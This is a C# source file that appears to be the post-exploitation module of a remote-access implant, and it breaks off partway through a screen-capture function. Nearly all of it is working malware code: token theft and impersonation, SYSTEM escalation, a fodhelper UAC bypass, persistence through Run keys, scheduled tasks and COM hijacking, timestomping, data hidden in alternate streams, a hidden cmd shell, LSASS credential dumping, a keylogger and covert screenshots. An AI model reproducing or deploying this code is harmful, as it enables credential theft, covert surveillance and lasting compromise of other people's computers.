// AgentPostEx.cs — Post-exploitation capabilities compiled alongside Agent.cs
// Requires: Agent.cs (HttpTransport, Win32, Screenshot, Json, Crypto, Config)
// Compiled by the server with: mcs Agent.cs AgentPostEx.cs AgentEvasion.cs Config_*.cs ...

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

// ─── Shared transport reference (set by Commander ctor) ──────────────────────

static class PostExShared
{
    internal static HttpTransport Transport;
    // screenwatch results buffered here when no direct send
    internal static readonly Queue<string> ScreenwatchFrames = new Queue<string>();
}

// ─── Win32 P/Invoke for post-ex (separate from Win32 in Agent.cs) ────────────

static class W32PX
{
    // ── Process / token ──
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hToken, uint access, IntPtr attr,
        int impLevel, int tokenType, out IntPtr hNew);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    [DllImport("advapi32.dll")]
    public static extern bool RevertToSelf();
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr hToken, int infoClass,
        IntPtr buf, int len, out int ret);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool LookupAccountSid(string sys, IntPtr sid,
        StringBuilder name, ref int nameLen, StringBuilder dom, ref int domLen, out int use);

    // ── Memory ──
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr addr, int size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr addr, int size, uint newProt, out uint oldProt);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr addr, int size, uint type);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern int VirtualQueryEx(IntPtr proc, IntPtr addr,
        ref MEMORY_BASIC_INFORMATION mbi, int len);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out int read);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out int written);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string mod);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr mod, string proc);
    [DllImport("kernel32.dll", EntryPoint="GetProcAddress")]
    public static extern IntPtr GetProcAddressByOrdinal(IntPtr mod, IntPtr ordinal);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lib);

    // ── Minidump ──
    [DllImport("dbghelp.dll", SetLastError=true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProc, int pid, IntPtr hFile,
        uint dumpType, IntPtr excParam, IntPtr userParam, IntPtr cbParam);

    // ── Named pipe ──
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateNamedPipe(string name, uint openMode, uint pipeMode,
        uint maxInst, uint outBuf, uint inBuf, uint timeout, IntPtr attr);
    [DllImport("kernel32.dll")]
    public static extern bool ConnectNamedPipe(IntPtr pipe, IntPtr overlap);
    [DllImport("advapi32.dll")]
    public static extern bool ImpersonateNamedPipeClient(IntPtr pipe);

    // ── Keyboard hook ──
    public delegate IntPtr LLKeyProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr SetWindowsHookEx(int hookType, LLKeyProc fn, IntPtr mod, uint threadId);
    [DllImport("user32.dll")]
    public static extern bool UnhookWindowsHookEx(IntPtr hook);
    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")]
    public static extern bool GetMessage(out MSG msg, IntPtr hwnd, uint min, uint max);
    [DllImport("user32.dll")]
    public static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")]
    public static extern IntPtr DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int vk);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hwnd, StringBuilder buf, int max);

    // ── Clipboard ──
    [DllImport("user32.dll")]
    public static extern bool OpenClipboard(IntPtr hwnd);
    [DllImport("user32.dll")]
    public static extern bool CloseClipboard();
    [DllImport("user32.dll")]
    public static extern bool IsClipboardFormatAvailable(uint fmt);
    [DllImport("user32.dll")]
    public static extern IntPtr GetClipboardData(uint fmt);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalLock(IntPtr hmem);
    [DllImport("kernel32.dll")]
    public static extern bool GlobalUnlock(IntPtr hmem);

    // ── Process creation ──
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint logonFlags,
        string app, string cmd, uint creationFlags, IntPtr env, string cwd,
        ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcessWithLogonW(string user, string domain, string pass,
        uint logonFlags, string app, string cmd, uint creationFlags, IntPtr env, string cwd,
        ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string app, string cmd, IntPtr procAttr, IntPtr threadAttr,
        bool inherit, uint flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")]
    public static extern bool TerminateProcess(IntPtr hProc, uint exit);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

    // ── NT ──
    [DllImport("ntdll.dll")]
    public static extern int NtReadVirtualMemory(IntPtr hProc, IntPtr addr, byte[] buf, int len, out int read);

    // ── LSA / Kerberos ──
    [DllImport("secur32.dll")]
    public static extern int LsaConnectUntrusted(out IntPtr hLsa);
    [DllImport("secur32.dll")]
    public static extern int LsaLookupAuthenticationPackage(IntPtr hLsa,
        ref LSA_STRING pkgName, out int authPkg);
    [DllImport("secur32.dll")]
    public static extern int LsaCallAuthenticationPackage(IntPtr hLsa, int authPkg,
        IntPtr protocolSubmitBuf, int submitBufLen, out IntPtr protocolReturnBuf,
        out int returnBufLen, out int protocolStatus);
    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr buf);

    // ── ADS ──
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr FindFirstStreamW(string path, int infoLevel,
        ref WIN32_FIND_STREAM_DATA data, uint flags);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool FindNextStreamW(IntPtr h, ref WIN32_FIND_STREAM_DATA data);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FindClose(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool DeleteFileW(string path);

    // ── File time ──
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateFile(string path, uint access, uint share,
        IntPtr sec, uint creation, uint flags, IntPtr tpl);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetFileTime(IntPtr h, ref long created, ref long accessed, ref long written);

    // ── Structs ──
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint   AllocationProtect;
        public IntPtr RegionSize;
        public uint   State;
        public uint   Protect;
        public uint   Type;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct MSG
    {
        public IntPtr hwnd;
        public uint   message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint   time;
        public int    ptX, ptY;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public uint   dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int    dwProcessId, dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct WIN32_FIND_STREAM_DATA
    {
        public long StreamSize;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=296)]
        public string cStreamName;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING
    {
        public ushort Length, MaxLength;
        public IntPtr Buffer;
    }
}

// ─── PostEx — main capability class ──────────────────────────────────────────

static class PostEx
{
    // ── Token vault ──────────────────────────────────────────────────────────
    static Dictionary<string, IntPtr> _tokenVault = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);
    static string _lastStolenPid = "";

    public static string TokenSteal(string pidStr)
    {
        int pid;
        if (!int.TryParse(pidStr.Trim(), out pid)) return "error: invalid pid";
        var hProc = W32PX.OpenProcess(0x1400 /*QUERY_INFORMATION|VM_READ*/, false, pid);
        if (hProc == IntPtr.Zero) return "error: OpenProcess failed: " + Marshal.GetLastWin32Error();
        IntPtr hToken, hDup;
        if (!W32PX.OpenProcessToken(hProc, 0x0028 /*DUPLICATE|QUERY*/, out hToken))
        { W32PX.CloseHandle(hProc); return "error: OpenProcessToken: " + Marshal.GetLastWin32Error(); }
        bool ok = W32PX.DuplicateTokenEx(hToken, 0x02000000 /*ALL_ACCESS*/, IntPtr.Zero, 2, 2, out hDup);
        W32PX.CloseHandle(hToken); W32PX.CloseHandle(hProc);
        if (!ok) return "error: DuplicateTokenEx: " + Marshal.GetLastWin32Error();
        W32PX.ImpersonateLoggedOnUser(hDup);
        var key = pid.ToString();
        if (_tokenVault.ContainsKey(key)) W32PX.CloseHandle(_tokenVault[key]);
        _tokenVault[key] = hDup;
        _lastStolenPid   = key;
        return "Impersonating token from PID " + pid;
    }
    public static string TokenStore(string label)
    {
        if (string.IsNullOrEmpty(_lastStolenPid) || !_tokenVault.ContainsKey(_lastStolenPid))
            return "error: no recently stolen token";
        if (_tokenVault.ContainsKey(label)) W32PX.CloseHandle(_tokenVault[label]);
        _tokenVault[label] = _tokenVault[_lastStolenPid];
        _tokenVault.Remove(_lastStolenPid);
        _lastStolenPid = label;
        return "Token stored as: " + label;
    }
    public static string TokenUse(string label)
    {
        if (!_tokenVault.ContainsKey(label)) return "error: token '" + label + "' not found";
        W32PX.ImpersonateLoggedOnUser(_tokenVault[label]);
        return "Using token: " + label;
    }
    public static string TokenList()
    {
        if (_tokenVault.Count == 0) return "(no stored tokens)";
        return string.Join("\n", new List<string>(_tokenVault.Keys).ToArray());
    }
    public static string TokenDrop(string label)
    {
        if (!_tokenVault.ContainsKey(label)) return "error: not found";
        W32PX.CloseHandle(_tokenVault[label]);
        _tokenVault.Remove(label);
        W32PX.RevertToSelf();
        return "Token dropped: " + label;
    }

    // ── GetSystem ─────────────────────────────────────────────────────────────
    public static string GetSystem()
    {
        // Method 1: named-pipe impersonation
        string pipeName = @"\\.\pipe\EndgamePrivEsc_" + Environment.TickCount;
        var hPipe = W32PX.CreateNamedPipe(pipeName,
            0x00000003 /*PIPE_ACCESS_DUPLEX*/ | 0x40000000 /*FILE_FLAG_OVERLAPPED*/,
            0x00000006 /*PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE*/, 1, 512, 512, 0, IntPtr.Zero);
        if (hPipe != new IntPtr(-1))
        {
            var si = new W32PX.STARTUPINFO { cb = Marshal.SizeOf(typeof(W32PX.STARTUPINFO)) };
            W32PX.PROCESS_INFORMATION pi;
            string cmd = "cmd.exe /c echo x > " + pipeName;
            W32PX.CreateProcess(null, cmd, IntPtr.Zero, IntPtr.Zero, false,
                0x08000000 /*CREATE_NO_WINDOW*/, IntPtr.Zero, null, ref si, out pi);
            W32PX.ConnectNamedPipe(hPipe, IntPtr.Zero);
            if (W32PX.ImpersonateNamedPipeClient(hPipe))
            {
                W32PX.CloseHandle(hPipe);
                return "SYSTEM obtained via named-pipe impersonation";
            }
            W32PX.CloseHandle(hPipe);
        }
        // Method 2: duplicate token from winlogon
        foreach (var proc in Process.GetProcessesByName("winlogon"))
        {
            var r = TokenSteal(proc.Id.ToString());
            if (!r.StartsWith("error")) return "SYSTEM via winlogon token: " + r;
        }
        return "error: GetSystem failed";
    }

    // ── UAC bypass (fodhelper) ────────────────────────────────────────────────
    public static string UacBypass(string payload)
    {
        if (string.IsNullOrEmpty(payload)) payload = Environment.GetCommandLineArgs()[0];
        try
        {
            const string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
            using (var k = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                k.SetValue("", payload);
                k.SetValue("DelegateExecute", "");
            }
            Process.Start("fodhelper.exe");
            Thread.Sleep(2000);
            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
            return "UAC bypass attempted via fodhelper with payload: " + payload;
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── Persistence ──────────────────────────────────────────────────────────
    public static string PersistRun(string path)
    {
        try
        {
            using (var k = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                k.SetValue("EndgameSvc", path);
            return "Persistence set (Run key): " + path;
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string PersistTask(string name, string path)
    {
        try
        {
            var cmd = string.Format("schtasks.exe /create /tn \"{0}\" /tr \"{1}\" /sc onlogon /ru \"{2}\" /f",
                name, path, Environment.UserName);
            var p = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd)
                { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true });
            p.WaitForExit(5000);
            return "Scheduled task created: " + name;
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string PersistStartup(string path)
    {
        try
        {
            var dst = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                Path.GetFileName(path));
            File.Copy(path, dst, true);
            return "Copied to startup: " + dst;
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── Registry ops ─────────────────────────────────────────────────────────
    static RegistryKey ParseHive(ref string path)
    {
        RegistryKey hive;
        if      (path.StartsWith("HKLM\\")) { hive = Registry.LocalMachine;  path = path.Substring(5); }
        else if (path.StartsWith("HKCU\\")) { hive = Registry.CurrentUser;   path = path.Substring(5); }
        else if (path.StartsWith("HKCR\\")) { hive = Registry.ClassesRoot;   path = path.Substring(5); }
        else if (path.StartsWith("HKU\\"))  { hive = Registry.Users;         path = path.Substring(4); }
        else                                { hive = Registry.LocalMachine;  }
        return hive;
    }
    public static string RegQuery(string args)
    {
        var parts = args.Trim().Split(new[]{' '}, 2);
        string keyPath = parts[0], valueName = parts.Length > 1 ? parts[1] : "";
        var hive = ParseHive(ref keyPath);
        try
        {
            using (var k = hive.OpenSubKey(keyPath))
            {
                if (k == null) return "error: key not found";
                if (string.IsNullOrEmpty(valueName))
                {
                    var sb = new StringBuilder();
                    foreach (var n in k.GetValueNames())
                        sb.AppendLine(n + " = " + k.GetValue(n));
                    return sb.ToString();
                }
                var v = k.GetValue(valueName);
                return v == null ? "(not found)" : v.ToString();
            }
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string RegSet(string args)
    {
        var parts = args.Trim().Split(new[]{' '}, 3);
        if (parts.Length < 3) return "usage: REG_SET <hive\\key> <name> <value>";
        string keyPath = parts[0]; var hive = ParseHive(ref keyPath);
        try
        {
            using (var k = hive.CreateSubKey(keyPath))
                k.SetValue(parts[1], parts[2]);
            return "Set " + parts[0] + "\\" + parts[1] + " = " + parts[2];
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string RegDel(string args)
    {
        var parts = args.Trim().Split(new[]{' '}, 2);
        string keyPath = parts[0]; var hive = ParseHive(ref keyPath);
        try
        {
            using (var k = hive.OpenSubKey(keyPath, true))
            {
                if (k == null) return "error: key not found";
                if (parts.Length > 1) { k.DeleteValue(parts[1]); return "Deleted value: " + parts[1]; }
                hive.DeleteSubKeyTree(keyPath);
                return "Deleted key: " + args.Trim();
            }
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string RegEnum(string path)
    {
        path = path.Trim();
        var hive = ParseHive(ref path);
        try
        {
            using (var k = hive.OpenSubKey(path))
            {
                if (k == null) return "error: key not found";
                return string.Join("\n", k.GetSubKeyNames());
            }
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── ADS ──────────────────────────────────────────────────────────────────
    public static string AdsWrite(string args)
    {
        var parts = args.Split(new[]{' '}, 3);
        if (parts.Length < 3) return "usage: ADS_WRITE <file> <stream> <base64data>";
        try
        {
            var data = Convert.FromBase64String(parts[2]);
            File.WriteAllBytes(parts[0] + ":" + parts[1], data);
            return "Written " + data.Length + " bytes to " + parts[0] + ":" + parts[1];
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string AdsRead(string args)
    {
        var parts = args.Split(new[]{' '}, 2);
        if (parts.Length < 2) return "usage: ADS_READ <file> <stream>";
        try
        {
            var data = File.ReadAllBytes(parts[0] + ":" + parts[1]);
            return Convert.ToBase64String(data);
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
    public static string AdsList(string path)
    {
        path = path.Trim();
        var data = new W32PX.WIN32_FIND_STREAM_DATA();
        var h = W32PX.FindFirstStreamW(path, 0, ref data, 0);
        if (h == new IntPtr(-1)) return "error: " + Marshal.GetLastWin32Error();
        var sb = new StringBuilder();
        sb.AppendLine(data.cStreamName + " (" + data.StreamSize + " bytes)");
        while (W32PX.FindNextStreamW(h, ref data))
            sb.AppendLine(data.cStreamName + " (" + data.StreamSize + " bytes)");
        W32PX.FindClose(h);
        return sb.ToString().TrimEnd();
    }
    public static string AdsDel(string args)
    {
        var parts = args.Split(new[]{' '}, 2);
        if (parts.Length < 2) return "usage: ADS_DEL <file> <stream>";
        W32PX.DeleteFileW(parts[0] + ":" + parts[1]);
        return "Deleted stream: " + parts[0] + ":" + parts[1];
    }

    // ── Timestomp ────────────────────────────────────────────────────────────
    public static string Timestomp(string args)
    {
        var parts = args.Split(new[]{' '}, 2);
        if (parts.Length < 2) return "usage: TIMESTOMP <path> <YYYY-MM-DD HH:MM:SS>";
        try
        {
            var ts = DateTime.Parse(parts[1]);
            File.SetCreationTime(parts[0], ts);
            File.SetLastWriteTime(parts[0], ts);
            File.SetLastAccessTime(parts[0], ts);
            return "Timestamps modified: " + parts[0] + " → " + ts;
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── COM hijack ───────────────────────────────────────────────────────────
    public static string ComHijack(string args)
    {
        var parts = args.Split(new[]{' '}, 2);
        if (parts.Length < 2) return "usage: COM_HIJACK <CLSID> <dll_path>";
        try
        {
            var clsid = parts[0].Trim('{', '}');
            var keyPath = @"Software\Classes\CLSID\{" + clsid + @"}\InprocServer32";
            using (var k = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                k.SetValue("", parts[1]);
                k.SetValue("ThreadingModel", "Both");
            }
            return "COM hijack set for {" + clsid + "} → " + parts[1];
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── Interactive shell ────────────────────────────────────────────────────
    static Process _ishell;
    static readonly object _ishellLock = new object();

    public static string IshellStart()
    {
        lock (_ishellLock)
        {
            if (_ishell != null && !_ishell.HasExited) return "already running (PID " + _ishell.Id + ")";
            _ishell = new Process();
            _ishell.StartInfo = new ProcessStartInfo("cmd.exe")
            {
                UseShellExecute        = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            };
            _ishell.Start();
            _ishell.StandardInput.AutoFlush = true;
            return "Interactive shell started (PID " + _ishell.Id + ")";
        }
    }
    public static string IshellInput(string cmd)
    {
        lock (_ishellLock)
        {
            if (_ishell == null || _ishell.HasExited) return "error: no active shell — use ISHELL_START";
            _ishell.StandardInput.WriteLine(cmd);
            Thread.Sleep(600);
            var sb = new StringBuilder();
            try
            {
                _ishell.StandardOutput.BaseStream.ReadTimeout = 500;
                int ch;
                while ((ch = _ishell.StandardOutput.BaseStream.ReadByte()) != -1)
                    sb.Append((char)ch);
            }
            catch { }
            try
            {
                _ishell.StandardError.BaseStream.ReadTimeout = 300;
                int ch;
                while ((ch = _ishell.StandardError.BaseStream.ReadByte()) != -1)
                    sb.Append((char)ch);
            }
            catch { }
            return sb.Length > 0 ? sb.ToString() : "(no output)";
        }
    }
    public static string IshellStop()
    {
        lock (_ishellLock)
        {
            if (_ishell == null || _ishell.HasExited) return "no active shell";
            try { _ishell.Kill(); } catch { }
            _ishell = null;
            return "Interactive shell stopped";
        }
    }

    // ── LSASS dump (MiniDumpWriteDump) ───────────────────────────────────────
    public static string LsassDump()
    {
        try
        {
            var procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) return "error: lsass not found";
            int pid   = procs[0].Id;
            var hProc = W32PX.OpenProcess(0x001F0FFF /*PROCESS_ALL_ACCESS*/, false, pid);
            if (hProc == IntPtr.Zero)
                return "error: OpenProcess lsass: " + Marshal.GetLastWin32Error();
            var tmp  = Path.GetTempFileName();
            var hFile = W32PX.CreateFile(tmp, 0x40000000 /*GENERIC_WRITE*/, 0, IntPtr.Zero, 4/*OPEN_ALWAYS*/, 0, IntPtr.Zero);
            bool ok  = W32PX.MiniDumpWriteDump(hProc, pid, hFile, 2 /*MiniDumpWithFullMemory*/, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            W32PX.CloseHandle(hFile);
            W32PX.CloseHandle(hProc);
            if (!ok) { File.Delete(tmp); return "error: MiniDumpWriteDump: " + Marshal.GetLastWin32Error(); }
            var bytes = File.ReadAllBytes(tmp);
            File.Delete(tmp);
            const int maxInline = 5 * 1024 * 1024;
            if (bytes.Length > maxInline)
            {
                var dst = @"C:\Windows\Temp\lsass.dmp";
                File.WriteAllBytes(dst, bytes);
                return "Dump saved to " + dst + " (" + bytes.Length + " bytes)";
            }
            return "LSASS_DUMP:" + Convert.ToBase64String(bytes);
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── LSASS dump NT (no MiniDumpWriteDump) ─────────────────────────────────
    public static string LsassDumpNT()
    {
        try
        {
            var procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) return "error: lsass not found";
            int  pid   = procs[0].Id;
            var  hProc = W32PX.OpenProcess(0x0010 /*PROCESS_VM_READ*/ | 0x0400 /*PROCESS_QUERY_INFORMATION*/, false, pid);
            if (hProc == IntPtr.Zero) return "error: OpenProcess: " + Marshal.GetLastWin32Error();

            // Collect all committed readable regions
            var regions = new List<KeyValuePair<long,byte[]>>();
            IntPtr addr = IntPtr.Zero;
            var mbi = new W32PX.MEMORY_BASIC_INFORMATION();
            while (W32PX.VirtualQueryEx(hProc, addr, ref mbi, Marshal.SizeOf(mbi)) != 0)
            {
                if (mbi.State == 0x1000 /*MEM_COMMIT*/ && mbi.Protect != 0x01 /*PAGE_NOACCESS*/)
                {
                    var buf = new byte[(int)mbi.RegionSize];
                    int read;
                    W32PX.NtReadVirtualMemory(hProc, mbi.BaseAddress, buf, buf.Length, out read);
                    if (read > 0) regions.Add(new KeyValuePair<long,byte[]>((long)mbi.BaseAddress, buf));
                }
                try { addr = new IntPtr((long)mbi.BaseAddress + (long)mbi.RegionSize); } catch { break; }
            }
            W32PX.CloseHandle(hProc);

            // Build minimal valid minidump (header + memory64 list)
            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                // MINIDUMP_HEADER
                bw.Write(Encoding.ASCII.GetBytes("MDMP")); // Signature
                bw.Write(0x0000A793);   // Version (Win10)
                bw.Write(1);            // NumberOfStreams
                bw.Write(32);           // StreamDirectoryRva (right after header)
                bw.Write(0); bw.Write(0); bw.Write((long)3); // checksum, timeDateStamp, flags

                // MINIDUMP_DIRECTORY for Memory64List stream (type=9)
                long dirRva = ms.Position;
                bw.Write(9);   // StreamType = Memory64ListStream
                bw.Write(0);   // DataSize (fill later)
                bw.Write(0L);  // Rva (fill later)

                // MINIDUMP_MEMORY64_LIST
                long streamStart = ms.Position;
                bw.Write((long)regions.Count);  // NumberOfMemoryRanges
                // BaseRva = position after all entries (fill later)
                long baseRvaOffset = ms.Position;
                bw.Write(0L); // BaseRva placeholder

                // Memory descriptors
                foreach (var r in regions) { bw.Write(r.Key); bw.Write((long)r.Value.Length); }

                // Write actual memory data
                long dataStart = ms.Position;
                foreach (var r in regions) bw.Write(r.Value);

                // Patch BaseRva
                ms.Seek(baseRvaOffset, SeekOrigin.Begin);
                bw.Write(dataStart);

                // Patch directory DataSize and Rva
                long streamLen = dataStart - streamStart + regions.Count * 0; // data already written
                ms.Seek(dirRva + 4, SeekOrigin.Begin);
                bw.Write((int)(ms.Length - streamStart + 16 + regions.Count * 16));
                bw.Write((int)streamStart);

                var bytes = ms.ToArray();
                const int maxInline = 5 * 1024 * 1024;
                if (bytes.Length > maxInline)
                {
                    var dst = @"C:\Windows\Temp\lsass_nt.dmp";
                    File.WriteAllBytes(dst, bytes);
                    return "NT dump saved to " + dst + " (" + bytes.Length + " bytes)";
                }
                return "LSASS_DUMP_NT:" + Convert.ToBase64String(bytes);
            }
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }

    // ── Keylogger ────────────────────────────────────────────────────────────
    static IntPtr              _keyHook = IntPtr.Zero;
    static StringBuilder       _keyBuf  = new StringBuilder();
    static Thread              _keyThread;
    static bool                _keyRunning;
    static W32PX.LLKeyProc     _keyProc; // keep reference to prevent GC

    static IntPtr KeyCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (int)wParam == 0x0100 /*WM_KEYDOWN*/)
        {
            int vk = Marshal.ReadInt32(lParam);
            bool shift = (W32PX.GetKeyState(0x10) & 0x8000) != 0;
            bool caps  = (W32PX.GetKeyState(0x14) & 1) != 0;
            string key = VkToString(vk, shift, caps);
            if (!string.IsNullOrEmpty(key))
            {
                var wnd = new StringBuilder(256);
                W32PX.GetWindowText(W32PX.GetForegroundWindow(), wnd, 256);
                _keyBuf.AppendFormat("[{0}] {1}\n", wnd, key);
            }
        }
        return W32PX.CallNextHookEx(_keyHook, nCode, wParam, lParam);
    }
    static string VkToString(int vk, bool shift, bool caps)
    {
        if (vk >= 0x41 && vk <= 0x5A) { char c = (char)(vk); return ((caps ^ shift) ? c.ToString().ToUpper() : c.ToString().ToLower()); }
        if (vk >= 0x30 && vk <= 0x39) return shift ? ")!@#$%^&*("[vk-0x30].ToString() : ((char)vk).ToString();
        switch (vk)
        {
            case 0x0D: return "\n"; case 0x20: return " "; case 0x08: return "[BS]";
            case 0x09: return "\t"; case 0xBE: return shift ? ">" : "."; case 0xBC: return shift ? "<" : ",";
            case 0xBF: return shift ? "?" : "/"; case 0xBA: return shift ? ":" : ";";
            case 0xDE: return shift ? "\"" : "'"; case 0xDB: return shift ? "{" : "[";
            case 0xDD: return shift ? "}" : "]"; case 0xDC: return shift ? "|" : "\\";
            case 0xBD: return shift ? "_" : "-"; case 0xBB: return shift ? "+" : "=";
            case 0xC0: return shift ? "~" : "`";
            default: return vk >= 0x70 ? "[F" + (vk - 0x6F) + "]" : "";
        }
    }
    public static string KeylogStart()
    {
        if (_keyRunning) return "Keylogger already running";
        _keyRunning = true;
        _keyProc    = KeyCallback;
        _keyThread  = new Thread(() =>
        {
            _keyHook = W32PX.SetWindowsHookEx(13 /*WH_KEYBOARD_LL*/, _keyProc, W32PX.GetModuleHandle(null), 0);
            W32PX.MSG msg;
            while (_keyRunning && W32PX.GetMessage(out msg, IntPtr.Zero, 0, 0))
            {
                W32PX.TranslateMessage(ref msg);
                W32PX.DispatchMessage(ref msg);
            }
        }) { IsBackground = true, Name = "Keylogger" };
        _keyThread.Start();
        return "Keylogger started";
    }
    public static string KeylogStop()
    {
        _keyRunning = false;
        if (_keyHook != IntPtr.Zero) { W32PX.UnhookWindowsHookEx(_keyHook); _keyHook = IntPtr.Zero; }
        return "Keylogger stopped";
    }
    public static string KeylogDump()
    {
        var s = _keyBuf.ToString();
        _keyBuf.Clear();
        return string.IsNullOrEmpty(s) ? "(no keystrokes captured)" : s;
    }

    // ── Screenwatch ──────────────────────────────────────────────────────────
    static volatile bool _swRunning;
    static Thread        _swThread;

    public static string ScreenwatchStart(string intervalStr)
    {
        if (_swRunning) return "Screenwatch already running";
        int interval = 10;
        int.TryParse(intervalStr.Trim(), out interval);
        if (interval < 1) interval = 10;
        _swRunning = true;
        _swThread  = new Thread(() =>
        {
            while (_swRunning)
            {
                try
                {
                    var png = Screenshot.Capture();
                    if (png != null)
                    {
                        var b64 = "SCREENWATCH_FRAME:" + Convert.ToBase64String(png);
                        lock (PostExShared.ScreenwatchFrames)
                            PostExShared.ScreenwatchFrames.Enqueue(b64);
                        if (PostExShared.Transport != null)
